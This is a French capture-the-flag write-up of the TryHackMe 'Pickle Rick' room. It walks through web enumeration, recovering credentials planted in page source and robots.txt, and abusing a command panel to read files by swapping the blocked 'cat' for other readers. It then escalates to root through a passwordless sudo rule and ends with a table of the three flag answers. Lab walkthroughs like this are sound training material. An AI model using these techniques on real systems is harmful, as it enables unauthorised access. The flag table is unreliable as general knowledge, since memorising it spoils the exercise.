# TryHackMe: Pickle Rick

**Objectif :** exploiter l'application web de la room pour retrouver les trois ingredients demandes par Rick. Cette room est simple, mais elle introduit de tres bons reflexes : enumeration web, lecture du code source, bruteforce de repertoires, execution de commandes et verification des privileges.

---

## Introduction

La room **Pickle Rick** est une machine d'initiation orientee web. On ne cherche pas ici un shell reverse complexe ou une CVE exotique. Toute la progression repose sur une mauvaise gestion des secrets et sur un panneau de commandes insuffisamment protege. Le vrai enjeu est donc methodologique : trouver les bons indices, comprendre comment ils s'articulent, puis lire les trois fichiers correspondant aux ingredients de la potion.

---

## Question 1: What is the first ingredient that Rick needs?

### 1. Reconnaissance initiale

Je commence comme d'habitude par un scan reseau :

```bash
nmap -sC -sV <IP>
```

Ports ouverts observes :

- `22/tcp` - SSH
- `80/tcp` - HTTP

Le port 22 ne sert pas directement au debut. Le vrai point d'entree est clairement le service web.

### 2. Inspection manuelle du site

En ouvrant `http://<IP>/`, on tombe sur une page assez minimaliste. Le contenu visible ne donne pas directement de credentials, donc je passe tout de suite au code source HTML.

Dans le source, on trouve un commentaire contenant un nom d'utilisateur :

```text
R1ckRul3s
```

Ce n'est pas encore exploitable seul, mais c'est deja un tres bon indice.

### 3. Enumeration de contenu

Je lance ensuite un bruteforce de repertoires :

```bash
gobuster dir -u http://<IP>/ -w /usr/share/wordlists/dirb/common.txt
```

Chemins interessants trouves :

- `/robots.txt`
- `/login.php`
- `/portal.php`

### 4. Recuperation du mot de passe

Le fichier `robots.txt` contient une chaine qui ne ressemble pas a une directive classique :

```text
Wubbalubbadubdub
```

Vu le contexte Rick and Morty et le fait qu'on a deja un nom d'utilisateur, cette chaine fait un excellent candidat pour le mot de passe.

### 5. Connexion au panneau

Sur `login.php`, j'essaie le couple :

- Username : `R1ckRul3s`
- Password : `Wubbalubbadubdub`

La connexion reussit et redirige vers un **Command Panel**. C'est la vraie faille de la room : le site permet d'executer des commandes systeme.

### 6. Lecture du premier ingredient

Je liste les fichiers :

```bash
ls
```

Je vois notamment :

- `Sup3rS3cretPickl3Ingred.txt`
- `clue.txt`

La commande `cat` est desactivee dans ce panneau, donc j'utilise un autre binaire de lecture, par exemple `less`, `head`, `tail` ou `strings`.

```bash
less Sup3rS3cretPickl3Ingred.txt
```

Contenu lu :

```text
mr. meeseek hair
```

### Reponse

**First ingredient:** `mr. meeseek hair`

---

## Question 2: What is the second ingredient in Rick's potion?

### 1. Exploitation de l'indice local

Le fichier `clue.txt` donne l'orientation suivante : l'ingredient suivant se trouve ailleurs dans le systeme de fichiers.

Je lis donc le clue :

```bash
less clue.txt
```

L'indice pousse a chercher dans l'arborescence plutot que de rester dans le repertoire courant.

### 2. Recherche sur le systeme

Je cherche les fichiers dont le nom contient `ingredient` :

```bash
find / -type f -name "*ingredient*" 2>/dev/null
```

Je tombe sur un fichier interessant dans le home de Rick :

```text
/home/rick/second ingredients
```

### 3. Lecture du second ingredient

Comme le nom du fichier contient un espace, je l'encadre avec des guillemets :

```bash
less "/home/rick/second ingredients"
```

Contenu :

```text
1 jerry tear
```

### Reponse

**Second ingredient:** `1 jerry tear`

---

## Question 3: What is the last and final ingredient?

### 1. Verification des privileges

Une fois les premiers ingredients recuperes, il faut aller voir plus loin dans le systeme. Le bon reflexe a ce stade est toujours de tester les privileges sudo :

```bash
sudo -l
```

Sortie typique :

```text
(ALL) NOPASSWD: ALL
```

Autrement dit, l'utilisateur du panneau peut executer n'importe quelle commande en root sans mot de passe. C'est une misconfiguration critique.

### 2. Bascule root

Je prends un shell root :

```bash
sudo bash
```

Puis je me deplace dans `/root` :

```bash
cd /root
ls -la
```

Je repere le fichier :

```text
3rd.txt
```

### 3. Lecture du dernier ingredient

```bash
less /root/3rd.txt
```

Contenu :

```text
fleeb juice
```

### Reponse

**Final ingredient:** `fleeb juice`

---

## Recapitulatif des reponses

| Question | Reponse |
|----------|---------|
| What is the first ingredient that Rick needs? | `mr. meeseek hair` |
| What is the second ingredient in Rick's potion? | `1 jerry tear` |
| What is the last and final ingredient? | `fleeb juice` |

---

## Points cles a retenir

- Toujours consulter le **source HTML** d'une page d'accueil.
- Un `robots.txt` contenant autre chose que des directives standards merite toujours une verification.
- Quand `cat` est bloque, il existe toujours d'autres alternatives : `less`, `head`, `tail`, `strings`, `awk`, `sed`.
- Un `sudo -l` est obligatoire apres toute execution de commande locale.

---

**Auteur :** Saad Idrissi
